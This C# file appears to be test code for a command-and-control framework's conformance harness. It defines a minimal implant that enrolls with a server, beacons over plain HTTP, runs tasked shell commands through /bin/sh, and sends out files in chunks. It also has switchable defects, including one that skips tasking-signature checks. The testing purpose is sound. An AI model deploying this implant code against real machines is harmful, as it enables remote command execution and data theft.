using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Conformance.Tests;

/// <summary>
/// The deliberate defects the harness's in-process implant can carry. Each
/// one breaks exactly one contract clause; the rest of the implementation
/// stays conforming, so a failing clause is attributable to its defect and
/// the harness names it.
/// </summary>
public sealed record ImplantDefects(
    bool SkipSignatureVerification = false,
    bool SpeakHandshakeSecond = false,
    bool ScrambleChunkSequences = false);

/// <summary>
/// A minimal Tier 0/Tier 1 implant written straight from the contract doc,
/// in-process so the harness can switch defects on and off: ECDSA P-256
/// enroll, the plain-HTTP envelope contact (one POST per poll cycle, the
/// plaintext lab posture), canonical tasking-signature verification,
/// shell.exec execution, and chunked file.pull exfil. The deliberately
/// broken candidates the acceptance criterion names are this implant with
/// one defect flipped on.
/// </summary>
public sealed class MinimalImplant : IImplantCandidate
{
    public CandidateTransport Transport => CandidateTransport.Envelope;

    private readonly ImplantDefects _defects;
    private readonly HttpClient _http = new();
    private CancellationTokenSource? _running;
    private Task? _loop;

    // The replay-nonce state (architecture.md Sec 9), the reference posture:
    // advertise at every handshake, honor the echo, and keep the accepted
    // nonce floor across cycles -- the server's counter is per-implant.
    private readonly TaskNonceFloor _nonces = new();
    private bool _negotiated;

    public MinimalImplant(ImplantDefects defects)
    {
        _defects = defects;
    }

    public bool HasExited => _loop is null || _loop.IsCompleted;

    public Task StartAsync(ConformanceTarget target)
    {
        if (_running is not null)
            throw new InvalidOperationException("The candidate is already running.");
        _running = new CancellationTokenSource();
        _loop = Task.Run(() => RunAsync(target, _running.Token));
        return Task.CompletedTask;
    }

    public async Task StopAsync()
    {
        _running?.Cancel();
        if (_loop is not null)
        {
            try
            {
                await _loop;
            }
            catch (OperationCanceledException)
            {
            }
            catch (HttpRequestException)
            {
                // A failed contact surfaces here; the stop is the intent.
            }
        }
        _loop = null;
        _running = null;
    }

    public void Dispose() => _http.Dispose();

    private async Task RunAsync(ConformanceTarget target, CancellationToken cancellationToken)
    {
        // Tier 1: refuse to start past the baked kill date.
        if (target.KillDate is { } killDate && killDate < DateTimeOffset.UtcNow)
            return;

        // Tier 0, half one: generate the keypair, enroll the public half.
        using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        using var response = await _http.PostAsJsonAsync(target.EnrollUrl, new
        {
            stagerTokenSecret = target.StagerToken,
            publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
        }, cancellationToken);
        response.EnsureSuccessStatusCode();
        using var document = await System.Text.Json.JsonDocument.ParseAsync(
            await response.Content.ReadAsStreamAsync(cancellationToken), cancellationToken: cancellationToken);
        var root = document.RootElement;
        var implantId = root.GetProperty("implantId").GetString()!;
        var cas = root.GetProperty("caChain").EnumerateArray()
            .Select(b64 => X509CertificateLoader.LoadCertificate(Convert.FromBase64String(b64.GetString()!)))
            .ToArray();

        // Tier 0, half two: the envelope POST cycle until stopped. The
        // response's tasking executes after the cycle; its results and chunks
        // ride the next cycle's request -- the poll discipline the contract
        // sets.
        var pending = new List<Frame>();
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                pending = await ContactOnceAsync(target, implantId, cas, pending, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception)
            {
                // A failed contact is a dropped cycle for a poll loop.
            }
            await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken);
        }
    }

    private async Task<List<Frame>> ContactOnceAsync(
        ConformanceTarget target,
        string implantId,
        X509Certificate2[] cas,
        List<Frame> pending,
        CancellationToken cancellationToken)
    {
        var outbound = new List<Frame>();

        // The defect variant speaks its result frame first; the server answers
        // an unspecified handshake status and closes, which is the point.
        if (_defects.SpeakHandshakeSecond)
        {
            outbound.Add(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult().ToByteArray()),
            });
        }

        outbound.Add(new Frame
        {
            Payload = ByteString.CopyFrom(new HandshakeRequest
            {
                Version = new ProtocolVersion { Major = 1, Minor = 0 },
                ImplantId = implantId,
                Capabilities = { "shell.exec", "file.pull" },
                ReplayNonces = true,
            }.ToByteArray()),
        });
        outbound.AddRange(pending);

        using var response = await _http.PostAsync(
            $"http://{target.BeaconHostPort}/implants/beacon",
            new ByteArrayContent(Encode(outbound)), cancellationToken);
        response.EnsureSuccessStatusCode();
        var inbound = Parse(await response.Content.ReadAsByteArrayAsync(cancellationToken));
        if (inbound.Count == 0)
            return new List<Frame>();
        var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
        if (handshake.Status != HandshakeStatus.Ok)
            return new List<Frame>(); // Every non-OK status is permanent: stop contacting.
        _negotiated = handshake.ReplayNonces;

        var next = new List<Frame>();
        foreach (var frame in inbound.Skip(1))
        {
            if (frame.Kind == FrameKind.ChannelInput)
                continue; // No channel verb advertised: input never routes here.
            var request = TaskRequest.Parser.ParseFrom(frame.Payload);

            var outcome = Rod.V1.TaskOutcome.Failed;
            var output = "rejected";
            if (_defects.SkipSignatureVerification || VerifyTasking(cas, implantId, request))
            {
                if (request.Verb == "shell.exec")
                {
                    (outcome, output) = RunShell(request.Arguments);
                }
                else if (request.Verb == "file.pull")
                {
                    (outcome, output) = FilePull(next, request);
                }
                else
                {
                    output = "unknown verb";
                }
            }
            else if (request.HasTaskNonce && _nonces.IsReplay(request.TaskNonce))
            {
                output = $"task rejected: replayed tasking (nonce {request.TaskNonce}); not executed";
            }

            next.Add(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = request.TaskId,
                    Outcome = outcome,
                    Output = output,
                }.ToByteArray()),
            });
        }
        return next;
    }

    private static (Rod.V1.TaskOutcome Outcome, string Output) RunShell(string arguments)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = "-c \"" + arguments.Replace("\"", "\\\"") + "\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        using var process = System.Diagnostics.Process.Start(psi)!;
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit(15000);
        return process.ExitCode == 0
            ? (Rod.V1.TaskOutcome.Succeeded, output)
            : (Rod.V1.TaskOutcome.Failed, output);
    }

    private (Rod.V1.TaskOutcome Outcome, string Output) FilePull(List<Frame> next, TaskRequest request)
    {
        var path = request.Arguments.Split(' ')[0];
        if (!File.Exists(path))
            return (Rod.V1.TaskOutcome.Failed, "no such file");

        var content = File.ReadAllBytes(path);
        const int chunkSize = 512 * 1024;
        var order = Enumerable.Range(0, (content.Length + chunkSize - 1) / chunkSize).ToList();
        if (_defects.ScrambleChunkSequences && order.Count > 1)
            order.Reverse(); // The defect: terminal-first, reversed sequences.

        foreach (var index in order)
        {
            var offset = index * chunkSize;
            var end = Math.Min(offset + chunkSize, content.Length);
            var slice = new byte[end - offset];
            Array.Copy(content, offset, slice, 0, slice.Length);
            next.Add(new Frame
            {
                Kind = FrameKind.ExfilChunk,
                Payload = ByteString.CopyFrom(new ExfilChunk
                {
                    TaskId = request.TaskId,
                    Name = Path.GetFileName(path),
                    ContentType = "application/octet-stream",
                    Sequence = (ulong)index,
                    Terminal = index == order.Count - 1,
                    Data = ByteString.CopyFrom(slice),
                }.ToByteArray()),
            });
        }
        return (Rod.V1.TaskOutcome.Succeeded, path);
    }

    /// <summary>
    /// Tier 1 tasking verification per the contract doc: RSASSA-PSS over
    /// SHA-256 on the canonical length-prefixed tuple -- the own implant_id,
    /// task_id, verb, arguments, and the nonce when the task carries one --
    /// followed by the replay-nonce floor: a nonce at or below the accepted
    /// floor is a replayed frame, and nonce-less tasking is refused once the
    /// arm was negotiated.
    /// </summary>
    private bool VerifyTasking(
        X509Certificate2[] cas,
        string implantId,
        TaskRequest request)
    {
        if (request.Signature.Length == 0)
            return false;

        using var canonical = new MemoryStream();
        var fields = request.HasTaskNonce
            ? new[] { implantId, request.TaskId, request.Verb, request.Arguments, request.TaskNonce.ToString() }
            : new[] { implantId, request.TaskId, request.Verb, request.Arguments };
        foreach (var value in fields)
        {
            var bytes = System.Text.Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        var signed = canonical.ToArray();

        foreach (var ca in cas)
        {
            using var rsa = ca.GetRSAPublicKey();
            if (rsa is null)
                continue;
            if (!rsa.VerifyData(signed, request.Signature.ToByteArray(),
                    HashAlgorithmName.SHA256, RSASignaturePadding.Pss))
                continue;

            if (request.HasTaskNonce)
            {
                if (_nonces.IsReplay(request.TaskNonce))
                    return false;
                _nonces.Observed(request.TaskNonce);
                return true;
            }
            return !_negotiated;
        }
        return false;
    }

    /// <summary>
    /// The accepted-nonce floor: monotonic across the candidate's whole run,
    /// so a replayed frame is refused regardless of which cycle delivered it.
    /// </summary>
    private sealed class TaskNonceFloor
    {
        private ulong _highest;

        public bool IsReplay(ulong nonce) => nonce <= _highest;

        public void Observed(ulong nonce)
        {
            if (nonce > _highest)
                _highest = nonce;
        }
    }

    // The envelope codec: the protobuf canonical delimited-stream shape --
    // an unsigned varint length before each marshaled Frame.

    private static byte[] Encode(IReadOnlyList<Frame> frames)
    {
        var body = new MemoryStream();
        foreach (var frame in frames)
        {
            var marshaled = frame.ToByteArray();
            WriteVarint(body, marshaled.Length);
            body.Write(marshaled);
        }
        return body.ToArray();
    }

    private static List<Frame> Parse(byte[] body)
    {
        var frames = new List<Frame>();
        var position = 0;
        while (position < body.Length)
        {
            uint length = 0;
            var shift = 0;
            int delimiter;
            for (delimiter = 0; delimiter < 5; delimiter++)
            {
                var b = body[position + delimiter];
                length |= (uint)(b & 0x7f) << shift;
                if ((b & 0x80) == 0)
                    break;
                shift += 7;
            }
            position += delimiter + 1;
            frames.Add(Frame.Parser.ParseFrom(body, position, (int)length));
            position += (int)length;
        }
        return frames;
    }

    private static void WriteVarint(MemoryStream target, int value)
    {
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            target.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        target.WriteByte((byte)remaining);
    }
}
